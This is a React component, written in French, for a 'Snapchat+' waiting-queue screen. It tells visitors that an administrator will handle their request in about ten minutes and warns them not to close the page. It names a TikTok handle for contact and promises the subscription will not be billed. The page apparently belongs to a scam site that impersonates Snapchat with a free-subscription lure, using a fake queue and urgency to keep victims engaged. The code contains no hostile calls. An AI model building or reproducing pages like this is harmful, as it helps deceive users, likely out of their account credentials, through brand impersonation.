import { motion } from "framer-motion";
import { Users, Clock } from "lucide-react";

export default function WaitingQueue() {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-sm mx-auto"
    >
      <div className="bg-[#1a1a2e] border border-white/10 rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        {/* Logo */}
        <div className="flex flex-col items-center mb-6">
          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30">
            <span className="text-3xl">👻</span>
          </div>
          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
            Snapchat<span className="text-primary">+</span>
          </h1>
        </div>

        {/* Icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-primary/15 border border-primary/30 rounded-full flex items-center justify-center">
            <Users className="w-9 h-9 text-primary" />
          </div>
        </div>

        <h2 className="font-heading text-xl font-bold text-foreground mb-3">
          File d'attente active
        </h2>

        {/* Main message */}
        <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl px-4 py-4 mb-6">
          <p className="text-yellow-400 font-semibold text-sm leading-relaxed">
            🚦 Beaucoup de personnes font la demande en ce moment !
          </p>
          <p className="text-yellow-400/80 text-xs mt-1.5 leading-relaxed">
            Votre demande est bien enregistrée. Veuillez patienter quelques minutes, un administrateur va vous traiter très bientôt.
          </p>
        </div>

        {/* Dots loader */}
        <div className="flex justify-center gap-2 mb-5">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2.5 h-2.5 rounded-full bg-primary/50"
              animate={{ opacity: [0.3, 1, 0.3] }}
              transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.25 }}
            />
          ))}
        </div>

        {/* Wait time */}
        <div className="bg-[#252538] border border-white/10 rounded-xl px-4 py-3.5 mb-6 flex items-center justify-center gap-2">
          <Clock className="w-4 h-4 text-primary" />
          <span className="font-bold text-foreground text-sm">
            Temps d'attente estimé : ~10 min
          </span>
        </div>

        {/* Warning */}
        <div className="bg-red-500/15 border border-red-500/40 rounded-xl px-4 py-3 mb-6">
          <p className="text-red-400 font-bold text-sm">⚠️ NE FERMEZ PAS CETTE PAGE ⚠️</p>
          <p className="text-red-400/80 text-xs mt-0.5">Vous perdriez votre place dans la file</p>
        </div>

        {/* Contact */}
        <p className="text-muted-foreground text-xs mb-4 leading-relaxed">
          Si la demande prend trop de temps, contactez-nous sur TikTok{" "}
          <span className="text-primary font-semibold">@uhqmdr</span>
        </p>

        <p className="text-muted-foreground/40 text-xs leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>
  );
}